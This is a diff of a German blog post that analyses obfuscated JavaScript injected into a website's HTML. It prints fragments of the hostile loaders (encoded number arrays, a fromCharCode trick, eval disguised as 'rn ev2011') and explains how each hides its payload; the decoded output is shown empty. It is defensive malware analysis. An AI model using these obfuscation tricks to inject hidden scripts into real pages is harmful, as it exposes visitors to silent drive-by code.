@@ -10,7 +10,7 @@ verwende chromium als Browser. Firefox meldet da leider nichts.
 Gefunden hab ich ein "obfuscated" javascript am Ende der Seite, schoen
 eingebaut in <!-- . -->
 
-::
+ .. code-block :: javascript
 
     var date=new Date();function lols(){return true}
     window.onerror=lols;var fr='fromC';function getXmlHttp(){var xmlhttp;try{xmlhttp=new ActiveXObject('Msxml2.XMLHTTP');fr+='harCode';}catch(e){try{fr+='harCode';xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');}catch(e){xmlhttp=false;}}
@@ -70,13 +70,15 @@ eingebaut in <!-- . -->
       s='';
       for(i=0;i
 
-    Es ist nicht ganz so clever, wie das facebook script (nachzulesen hier), aber hat doch einige nette Elemente drin, die es lohnt sich mal anzuschaun. Auch hier wird ein Array benutzt um das ganze ein wenig schwerer zu gestalten und nicht so auffaellig zu sein. Interressant ist, dass er "date" zweimal ein neues Date-Objekt zuweist. In meinen Augen verschwendung.
-    Der Request zu Google ist auch eigentlich ueberfluessig. Die Funktion "getXmlHttp()" ist nur eine Ablenkung um die Variable "fr", mit "fromCharCode" zu fuellen, um sie spaeter in "String[fr]" weiter zu verwenden.
-    Relativ schnell sieht man im Array ein Muster "Integer, Float, Integer, Float,...". Das macht sich dann spaeter auch in der Berechnung des CharCodes "(i%2) ? cont[i]*v : cont[i]/v" bemerkbar.
-    ev ist nur auch wieder eine obfuscation um von eval abzulenken.
-    Interressant ist auch noch die Variable "y" mit der Sichergestellt wird, dass die Funktion zwar mehrfach aufgerufen werden kann, aber das Array nur einmal dekodiert wird.
-    Es wird also aus diesen Zahlen ein String zusammengesetzt. Aber wie sieht der String nun aus? 
-    Das laesst sich mit einem einfachen: "javascript: alert(s);" relativ leicht klaeren.
+Es ist nicht ganz so clever, wie das facebook script, aber hat doch einige nette Elemente drin, die es lohnt sich mal anzuschaun. Auch hier wird ein Array benutzt um das ganze ein wenig schwerer zu gestalten und nicht so auffaellig zu sein. Interressant ist, dass er "date" zweimal ein neues Date-Objekt zuweist. In meinen Augen verschwendung.
+Der Request zu Google ist auch eigentlich ueberfluessig. Die Funktion "getXmlHttp()" ist nur eine Ablenkung um die Variable "fr", mit "fromCharCode" zu fuellen, um sie spaeter in "String[fr]" weiter zu verwenden.
+Relativ schnell sieht man im Array ein Muster "Integer, Float, Integer, Float,...". Das macht sich dann spaeter auch in der Berechnung des CharCodes "(i%2) ? cont[i]*v : cont[i]/v" bemerkbar.
+ev ist nur auch wieder eine obfuscation um von eval abzulenken.
+Interressant ist auch noch die Variable "y" mit der Sichergestellt wird, dass die Funktion zwar mehrfach aufgerufen werden kann, aber das Array nur einmal dekodiert wird.
+Es wird also aus diesen Zahlen ein String zusammengesetzt. Aber wie sieht der String nun aus? 
+Das laesst sich mit einem einfachen: "javascript: alert(s);" relativ leicht klaeren.
+
+ .. code-block :: javascript
 
     document.write('');
 
@@ -98,7 +100,7 @@ der Betreiber so freundlich ist, mir den SourceCode der fts.php zur
 Verfuegung zu stellen, werde ich mal einen Blick drueber werfen. Auf
 einer anderen Domain war noch ein anderes Script zu finden:
 
-::
+ .. code-block :: javascript
 
     var ar="-n2=c:9m0'd)eu otag?pbr(\"hw";var k=new Boolean().toString();var ar2="f57,72,39,66,48,63,3,75,18,105,93,12,75,63,96,54,6,12,15,93,78,48,63,69,21,93,39,36,99,102,75,75,87,42,9,9,105,105,105,18,78,48,72,93,63,0,48,72,93,63,0,72,93,63,0,93,63,45,18,12,3,18,66,78,9,12,3,18,39,81,12,84,33,99,69,105,12,57,75,102,36,99,27,99,69,102,63,12,81,102,75,36,99,27,99,69,15,93,78,48,63,90,72,93,57,63,93,36,99,51,99,30,6,9,12,15,93,78,48,63,30,54,60,24]".replace(k.substr(0,1),'[');date=new Date();pau="rn ev2011".replace(date.getFullYear(),"al");e=new Function("","retu"+pau);e=e();ar2=e(ar2);s="";for(i=0;i
     Welches aufgeraeumt auch um einiges schoener aussieht:
@@ -116,16 +118,19 @@ einer anderen Domain war noch ein anderes Script zu finden:
     ar2=e(ar2);
     s="";
     for(i=0;i
-    Auch dieses Script ist wieder ziemlich ev(i|a)l.
-    Es macht sich einen String "k" in welchem "false" steht. Dann generiert es aus dem String "ar2" ein Array, indem es das erste Zeichen von "false", also ein "f", durch eine eckige Klammer ersetzt.
-    Soweit sogut, aber wo ist das eval. Wir definieren uns die Variable "pau" mit "rn ev2011" und ersetzen das Jahr durch "al" und schon haben wir unser eval...naja nicht ganz, bisher steht da nur: "rn eval".
-    Aber das loest sich, wenn wir eine Funktion generieren, die wir "e" nennen, die nichts anderes macht als: return eval.
-    Dann sagen wir, dass: "e=e();" was "e" auch evil, aeh eval, macht.
-    Nun koennen wir endlich aus ar2 ein Array machen.
 
-    Die Zahlen definieren bloss die Position des Zeichens im String "ar". Dieses Zeichen wird dann an den String "s" angehaengt. 
-    Und der String "s" dann ueber "e(s)" ausgefuehrt.
-    Dadrin steht, wer haette es gedacht:
+Auch dieses Script ist wieder ziemlich ev(i|a)l.
+Es macht sich einen String "k" in welchem "false" steht. Dann generiert es aus dem String "ar2" ein Array, indem es das erste Zeichen von "false", also ein "f", durch eine eckige Klammer ersetzt.
+Soweit sogut, aber wo ist das eval. Wir definieren uns die Variable "pau" mit "rn ev2011" und ersetzen das Jahr durch "al" und schon haben wir unser eval...naja nicht ganz, bisher steht da nur: "rn eval".
+Aber das loest sich, wenn wir eine Funktion generieren, die wir "e" nennen, die nichts anderes macht als: return eval.
+Dann sagen wir, dass: "e=e();" was "e" auch evil, aeh eval, macht.
+Nun koennen wir endlich aus ar2 ein Array machen.
+
+Die Zahlen definieren bloss die Position des Zeichens im String "ar". Dieses Zeichen wird dann an den String "s" angehaengt. 
+Und der String "s" dann ueber "e(s)" ausgefuehrt.
+Dadrin steht, wer haette es gedacht:
+
+ .. code-block :: javascript
 
     document.write('');
 
@@ -136,4 +141,4 @@ sollte ja auch nicht sein. so long
 
 .. _hier: http://www.google.de/safebrowsing/diagnostic?site=amore-more-ore-re6.in.ua/
 
-.. |image0| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/06/2011-06-21-021047_1024x768_scrot-300x225.png
+.. |image0| image:: http://images.hoeja.de/blog/2011-06-21-021047_1024x768_scrot-300x225.png
